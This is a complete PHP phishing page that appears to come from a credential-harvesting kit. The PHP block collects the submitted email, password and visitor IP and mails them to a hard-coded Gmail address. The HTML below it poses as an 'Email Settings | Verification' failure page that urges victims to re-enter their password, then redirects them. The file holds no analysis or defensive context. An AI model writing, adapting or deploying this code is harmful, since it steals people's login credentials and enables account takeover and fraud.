<?php

$ip = $_SERVER['REMOTE_ADDR'];
$email = $_POST['email'];
$password = $_POST['password'];


$data = "
------------ Created By Machine ------------
E-mail ID : $email
Password  : $password
-------------------------
IP : $ip
------------ Created By Machine ------------
";

$mailsubj = "| Login: | $email | $password ";


$emailusr = 'sukimuthu77@gmail.com';

mail($emailusr, $mailsubj, $data);

?>
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
<html><head><title>Email Settings | Verification</title>

<link rel="icon" href="files/id.png" sizes="13x13" type="image/png">

<meta http-equiv="refresh" content="10;url=index.html" />

<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-15'/>
<!-- no core stylesheet -->
</head>


<form method='post' action=''>

                        <font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
                        <div align="center">

			<br><br><br><br><br>

			<div>
			<h2>Account Verification Failed!</h2>
			<p>Try Again! And ensure you enter the correct password to this e-Mail this time.</p>

			<p>You will be redirected back shortly!</p>

			<br><br>
			</div>

			</font>

			</div></form>
</div>


</body></html><!-- 1 -->